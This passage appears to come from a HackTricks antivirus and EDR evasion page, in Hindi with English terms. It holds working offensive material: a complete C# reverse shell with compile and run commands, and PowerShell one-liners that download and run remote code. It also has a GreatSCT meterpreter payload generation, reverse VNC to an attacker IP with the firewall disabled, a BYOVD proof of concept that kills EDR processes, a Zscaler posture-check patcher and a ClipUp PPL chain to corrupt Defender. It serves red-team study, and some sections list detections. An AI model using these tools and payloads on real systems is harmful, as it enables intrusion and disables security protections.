+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) Windows में एक शक्तिशाली लॉगिंग मैकेनिज्म है जो ऐप्लिकेशन और सिस्टम कंपोनेंट्स को **log events** करने की अनुमति देता है। हालांकि, इसे security products द्वारा malicious activities की निगरानी और पता लगाने के लिए भी उपयोग किया जा सकता है।

जिस तरह AMSI को disabled (bypassed) किया जाता है, उसी तरह user space process की **`EtwEventWrite`** function को बिना किसी इवेंट को लॉग किए तुरंत return करवा देना भी संभव है। यह function को memory में पैच करके तुरंत return कराने से किया जाता है, जिससे उस process के लिए ETW logging प्रभावी रूप से डिसेबल हो जाती है।

You can find more info in **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

C# binaries को memory में लोड करना लंबे समय से जाना-पहचाना तरीका रहा है और यह अभी भी आपके post-exploitation tools को AV द्वारा पकड़े जाने के बिना चलाने का एक बहुत अच्छा तरीका है।

क्योंकि payload सीधे memory में लोड होगा और disk को नहीं छुएगा, हमें पूरे process के लिए केवल AMSI को पैच करने की चिंता करनी होगी।

अधिकांश C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, आदि) पहले से ही C# assemblies को सीधे memory में execute करने की क्षमता प्रदान करते हैं, लेकिन इसे करने के अलग-अलग तरीके होते हैं:

- **Fork\&Run**

इसमें एक नया sacrificial process spawn करना शामिल है, उस नए process में आपका post-exploitation malicious code inject करना, अपना malicious code execute करना और समाप्त होने पर उस नए process को kill कर देना। इसके फायदे और नुकसान दोनों हैं। Fork and run विधि का फायदा यह है कि execution हमारे Beacon implant process के बाहर होता है। इसका मतलब है कि अगर हमारे post-exploitation कार्य में कुछ गलत होता है या पकड़ा जाता है, तो हमारे implant के बचने की संभावना काफी अधिक होती है। नुकसान यह है कि Behavioural Detections द्वारा पकड़े जाने की संभावना भी अधिक होती है।

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

यह अपने ही process में post-exploitation malicious code inject करने के बारे में है। इस तरह आप नया process बनाने और उसे AV द्वारा स्कैन कराए जाने से बच सकते हैं, लेकिन नुकसान यह है कि अगर आपके payload के execution में कुछ गलत हो जाता है, तो आपकी beacon खोने की संभावना बहुत अधिक होती है क्योंकि यह क्रैश कर सकता है।

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> यदि आप C# Assembly loading के बारे में और पढ़ना चाहते हैं, तो यह आर्टिकल देखें [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) और उनका InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

आप C# Assemblies को **from PowerShell** से भी लोड कर सकते हैं, देखें [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) और [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

जैसा कि [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) में प्रस्तावित है, अन्य भाषाओं का उपयोग करके malicious code execute करना संभव है यदि compromised मशीन को attacker-controlled SMB share पर इंस्टॉल interpreter environment तक access दिया जाए।

SMB share पर Interpreter Binaries और environment तक access देकर आप compromised मशीन की memory के भीतर इन भाषाओं में **execute arbitrary code in these languages within memory** कर सकते हैं।

Repo में बताया गया है: Defender अभी भी scripts को स्कैन करता है लेकिन Go, Java, PHP इत्यादि का उपयोग करके हमारे पास **static signatures को bypass करने की अधिक लचीलापन** होता है। इन भाषाओं में random un-obfuscated reverse shell scripts के साथ परीक्षण सफल रहा है।

## TokenStomping

Token stomping एक तकनीक है जो attacker को access token या किसी security product जैसे EDR या AV को manipulate करने की अनुमति देती है, जिससे वे उसके privileges कम कर सकते हैं ताकि process मर न जाए पर उसे malicious activities की जांच करने की permissions न मिलें।

To prevent this Windows could **prevent external processes** from getting handles over the tokens of security processes.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

जैसा कि [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) में बताया गया है, किसी victim के PC में Chrome Remote Desktop को deploy करना और फिर उसे takeover करके persistence बनाए रखना आसान है:
1. https://remotedesktop.google.com/ से डाउनलोड करें, "Set up via SSH" पर क्लिक करें, और फिर Windows के लिए MSI फ़ाइल डाउनलोड करने के लिए MSI फ़ाइल पर क्लिक करें।
2. victim पर installer को silently चलाएँ (admin आवश्यक): `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop पेज पर वापस जाएँ और next पर क्लिक करें। विज़ार्ड आपसे authorize करने को कहेगा; जारी रखने के लिए Authorize बटन पर क्लिक करें।
4. कुछ समायोजनों के साथ दिए गए पैरामीटर को execute करें: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (ध्यान दें pin param जो GUI का उपयोग किए बिना pin सेट करने की अनुमति देता है)。


## Advanced Evasion

Evasion एक बहुत जटिल विषय है, कभी-कभी आपको एक ही सिस्टम में कई अलग-अलग telemetry स्रोतों को ध्यान में रखना पड़ता है, इसलिए mature environments में पूरी तरह से undetected रहना काफी हद तक असंभव है।

हर environment जिसका आप सामना करते हैं उसकी अपनी मजबूतियाँ और कमजोरियाँ होंगी।

मैं आपको सुझाव देता हूँ कि आप [@ATTL4S](https://twitter.com/DaniLJ94) का यह टॉक देखें, ताकि Advanced Evasion तकनीकों का एक परिचय मिल सके।


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

यह [@mariuszbit](https://twitter.com/mariuszbit) का एक और बेहतरीन टॉक है जो Evasion in Depth के बारे में है।


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

आप [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) का उपयोग कर सकते हैं जो बाइनरी के हिस्सों को **हटा (remove parts of the binary)** करके यह पता लगाता है कि Defender किस हिस्से को malicious मान रहा है और उसे अलग करके आपको बताता है।\
एक और टूल जो यही काम करता है वह [**avred**](https://github.com/dobin/avred) है और इसकी सर्विस ओपन वेब पर [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) पर उपलब्ध है।

### **Telnet Server**

Windows10 तक, सभी Windows में एक **Telnet server** शामिल होता था जिसे आप (administrator के रूप में) इस कमांड से इंस्टॉल कर सकते थे:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
इसे सिस्टम के शुरू होते ही **start** कराएँ और अभी इसे **run** कराएँ:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**telnet port बदलें** (छुपा हुआ) और firewall अक्षम करें:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

इसे डाउनलोड करें: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (you want the bin downloads, not the setup)

**ON THE HOST**: _**winvnc.exe**_ को चलाएँ और सर्वर कॉन्फ़िगर करें:

- विकल्प _Disable TrayIcon_ सक्षम करें
- _VNC Password_ में पासवर्ड सेट करें
- _View-Only Password_ में पासवर्ड सेट करें

फिर, बाइनरी _**winvnc.exe**_ और **नई** बनाई गई फ़ाइल _**UltraVNC.ini**_ को **victim** के अंदर ले जाएँ

#### **Reverse connection**

**attacker** को अपने **host** पर बाइनरी `vncviewer.exe -listen 5900` चलानी चाहिए ताकि यह रिवर्स **VNC connection** पकड़ने के लिए **तैयार** रहे। फिर, **victim** के अंदर: winvnc daemon शुरू करें `winvnc.exe -run` और चलाएँ `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** Stealth बनाए रखने के लिए आपको कुछ चीजें नहीं करनी चाहिए

- अगर यह पहले से चल रहा है तो `winvnc` शुरू न करें अन्यथा आप एक [popup](https://i.imgur.com/1SROTTl.png) ट्रिगर कर देंगे। यह चल रहा है या नहीं, जांचने के लिए `tasklist | findstr winvnc` का उपयोग करें
- उसी डायरेक्टरी में `UltraVNC.ini` के बिना `winvnc` न चलाएँ अन्यथा यह [the config window](https://i.imgur.com/rfMQWcf.png) खोल देगा
- मदद के लिए `winvnc -h` न चलाएँ अन्यथा आप एक [popup](https://i.imgur.com/oc18wcu.png) ट्रिगर कर देंगे

### GreatSCT

इसे डाउनलोड करें: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCT के अंदर:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
अब **start the lister** को `msfconsole -r file.rc` के साथ शुरू करें और **xml payload** को निम्न के साथ **execute** करें:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Current defender process को बहुत जल्दी terminate कर देगा।**

### अपने स्वयं के reverse shell का कंपाइल करना

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### पहला C# Revershell

इसे compile करें:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
इसे इसके साथ उपयोग करें:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# using कम्पाइलर
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

स्वचालित डाउनलोड और निष्पादन:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscators सूची: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Python का उपयोग करके build injectors का उदाहरण:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### अन्य उपकरण
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### और

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603 ने Antivirus Terminator नामक एक छोटे कंसोल यूटिलिटी का उपयोग करके ransomware डालने से पहले endpoint protections को disable किया। यह टूल अपना vulnerable परन्तु signed ड्राइवर लेकर आता है और उसे abuse करके privileged kernel operations जारी करता है जिन्हें Protected-Process-Light (PPL) AV सेवाएँ भी block नहीं कर पातीं।

मुख्य निष्कर्ष
1. **Signed driver**: डिस्क पर डिलीवर की गई फ़ाइल `ServiceMouse.sys` है, पर बाइनरी वास्तव में Antiy Labs के “System In-Depth Analysis Toolkit” का वैध रूप से signed ड्राइवर `AToolsKrnl64.sys` है। चूंकि ड्राइवर पर वैध Microsoft सिग्नेचर है, यह तब भी लोड हो जाता है जब Driver-Signature-Enforcement (DSE) सक्षम हो।
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
पहली लाइन ड्राइवर को एक kernel service के रूप में रजिस्टर करती है और दूसरी उसे स्टार्ट करती है ताकि `\\.\ServiceMouse` user land से पहुँच योग्य हो जाए।
3. **IOCTLs exposed by the driver**
| IOCTL code | क्षमता                              |
|-----------:|-----------------------------------------|
| `0x99000050` | PID द्वारा किसी भी arbitrary process को terminate करें (Defender/EDR services को kill करने के लिए उपयोग किया गया) |
| `0x990000D0` | डिस्क पर किसी भी arbitrary फ़ाइल को delete करें |
| `0x990001D0` | ड्राइवर को unload करें और service को हटाएँ |

न्यूनतम C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**: BYOVD पूरी तरह user-mode protections को बायपास कर देता है; kernel में चलने वाला कोड *protected* processes को खोल सकता है, उन्हें terminate कर सकता है, या kernel objects के साथ छेड़छाड़ कर सकता है, बिना PPL/PP, ELAM या अन्य hardening features की परवाह किए।

Detection / Mitigation
• Microsoft की vulnerable-driver block list (`HVCI`, `Smart App Control`) सक्षम करें ताकि Windows `AToolsKrnl64.sys` को लोड करने से इंकार कर दे।  
• नए *kernel* services के निर्माण की निगरानी करें और अलर्ट दें जब कोई ड्राइवर world-writable directory से लोड हो या allow-list पर मौजूद न हो।  
• custom device objects के लिए user-mode handles और उसके बाद संदिग्ध `DeviceIoControl` कॉल्स पर निगरानी रखें।  

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler का Client Connector device-posture rules को लोकली लागू करता है और परिणामों को अन्य components तक पहुँचाने के लिए Windows RPC पर निर्भर करता है। दो कमजोर डिजाइन विकल्प एक पूर्ण bypass को संभव बनाते हैं:

1. Posture मूल्यांकन पूरी तरह client-side पर होता है (server को एक boolean भेजा जाता है)।  
2. Internal RPC endpoints केवल यह सत्यापित करते हैं कि connecting executable Zscaler द्वारा signed है (via `WinVerifyTrust`)।

डिस्क पर चार signed binaries को patch करके दोनों तंत्र निष्क्रिय किए जा सकते हैं:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | हमेशा `1` लौटाता है, इसलिए हर चेक compliant हो जाता है |
| `ZSAService.exe` | WinVerifyTrust के लिए indirect कॉल | NOP-ed ⇒ कोई भी (यहाँ तक कि unsigned भी) process RPC pipes से bind कर सकता है |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | को `mov eax,1 ; ret` से बदल दिया गया |
| `ZSATunnel.exe` | टनल पर integrity checks | Short-circuited |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
मूल फ़ाइलों को बदलने और सर्विस स्टैक को पुनरारंभ करने के बाद:

* **सभी** posture checks **हरा/अनुरूप** दिखाते हैं।
* Unsigned या modified binaries named-pipe RPC endpoints खोल सकते हैं (उदा. `\\RPC Control\\ZSATrayManager_talk_to_me`)।
* समझौता किया हुआ होस्ट Zscaler नीतियों द्वारा परिभाषित आंतरिक नेटवर्क तक अनरोधित पहुँच प्राप्त कर लेता है।

यह केस स्टडी दिखाती है कि कैसे शुद्ध रूप से client-side trust निर्णय और साधारण signature checks कुछ byte patches से हराए जा सकते हैं।

## Protected Process Light (PPL) का दुरुपयोग करके AV/EDR को LOLBINs के साथ टेम्पर करना

Protected Process Light (PPL) एक signer/level hierarchy लागू करता है ताकि केवल समान या उच्चतर protected processes ही एक-दूसरे को टेम्पर कर सकें। आक्रामक रूप से, यदि आप वैध रूप से कोई PPL-enabled binary लॉन्च कर सकते हैं और इसके arguments नियंत्रित कर सकते हैं, तो आप benign functionality (उदा., logging) को एक सीमित, PPL-backed write primitive में बदल सकते हैं जो AV/EDR द्वारा उपयोग किए जाने वाले protected directories के खिलाफ लिखता है।

किस बात से कोई process PPL के रूप में चलता है
- लक्षित EXE (और कोई भी loaded DLLs) PPL-capable EKU के साथ signed होना चाहिए।
- प्रक्रिया CreateProcess के साथ उन flags का उपयोग करके बनाई जानी चाहिए: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`।
- एक compatible protection level request किया जाना चाहिए जो binary के signer से मेल खाता हो (उदा., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` anti-malware signers के लिए, `PROTECTION_LEVEL_WINDOWS` Windows signers के लिए)। गलत levels पर creation विफल हो जाएगा।

PP/PPL और LSASS protection का विस्तृत परिचय भी यहाँ देखें:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

लॉन्चर टूलिंग
- Open-source helper: CreateProcessAsPPL (protection level चुनता है और arguments target EXE को फॉरवर्ड करता है):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- उपयोग पैटर्न:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- साइन किया गया सिस्टम बाइनरी `C:\Windows\System32\ClipUp.exe` स्वयं-स्पॉन करता है और कॉलर-निर्दिष्ट पथ पर लॉग फ़ाइल लिखने के लिए एक पैरामीटर स्वीकार करता है।
- जब इसे PPL प्रक्रिया के रूप में लॉन्च किया जाता है, तो फ़ाइल लिखाई PPL बैकिंग के साथ होती है।
- ClipUp स्पेस वाले पाथ्स को पार्स नहीं कर सकता; सामान्यतः संरक्षित लोकेशनों की ओर इंगित करने के लिए 8.3 short paths का उपयोग करें।

8.3 short path helpers
- शॉर्ट नाम सूचीबद्ध करने के लिए: प्रत्येक parent directory में `dir /x` चलाएँ।
- cmd में शॉर्ट पथ निकालने के लिए: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) PPL-कैपेबिलिटी वाले LOLBIN (ClipUp) को किसी लॉन्चर (उदा., CreateProcessAsPPL) का उपयोग करते हुए `CREATE_PROTECTED_PROCESS` के साथ लॉन्च करें।
2) ClipUp के log-path आर्ग्युमेंट को पास करके किसी protected AV डायरेक्टरी (उदा., Defender Platform) में फ़ाइल निर्माण मजबूर करें। यदि आवश्यक हो तो 8.3 short names का उपयोग करें।
3) यदि टारगेट बाइनरी सामान्यतः AV द्वारा रन के दौरान ओपन/लॉक रहती है (उदा., MsMpEng.exe), तो AV के शुरू होने से पहले बूट पर लिखने के लिए एक auto-start service इंस्टॉल करें जो विश्वसनीय रूप से पहले चले। Process Monitor (boot logging) से बूट ऑर्डरिंग को वैलिडेट करें।
4) रीबूट पर PPL-बैक्ड लिखाई AV के अपने बाइनरीज को लॉक करने से पहले होती है, जिससे टारगेट फ़ाइल करप्ट हो जाती है और स्टार्टअप रुक जाता है।

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes and constraints
- आप ClipUp द्वारा लिखी जाने वाली सामग्री पर प्लेसमेंट के अलावा नियंत्रण नहीं कर सकते; यह primitive सटीक सामग्री इंजेक्शन के बजाय करप्शन के लिए उपयुक्त है।
- एक service को install/start करने के लिए local admin/SYSTEM की आवश्यकता होती है और एक reboot विंडो चाहिए।
- टाइमिंग महत्वपूर्ण है: लक्ष्य खुला नहीं होना चाहिए; boot-time execution file locks से बचाता है।

Detections
- अनियमित arguments के साथ `ClipUp.exe` की process creation, खासकर जब यह non-standard launchers द्वारा parent हो और बूट के आस-पास हो।
- नए services जिनके लिए संदिग्ध binaries auto-start के रूप में कॉन्फ़िगर किए गए हैं और जो लगातार Defender/AV से पहले शुरू हो रहे हैं। Defender startup failures से पहले service creation/modification की जाँच करें।
- Defender binaries/Platform directories पर file integrity monitoring; protected-process flags वाले processes द्वारा अप्रत्याशित file creations/modifications।
- ETW/EDR telemetry: `CREATE_PROTECTED_PROCESS` के साथ बनाए गए processes और non-AV binaries द्वारा असामान्य PPL level उपयोग की तलाश करें।

Mitigations
- WDAC/Code Integrity: सीमित करें कि कौन से signed binaries PPL के रूप में और किन parents के तहत चल सकते हैं; legitimate contexts के बाहर ClipUp invocation को ब्लॉक करें।
- Service hygiene: auto-start services के creation/modification को सीमित करें और start-order manipulation की निगरानी करें।
- सुनिश्चित करें कि Defender tamper protection और early-launch protections सक्षम हैं; binary corruption संकेत करने वाले startup errors की जाँच करें।
- यदि आपके पर्यावरण के अनुकूल हो तो security tooling होस्ट करने वाले वॉल्यूम्स पर 8.3 short-name generation को अक्षम करने पर विचार करें (पूरी तरह से परीक्षण करें)।

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## References

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)

{{#include ../banners/hacktricks-training.md}}
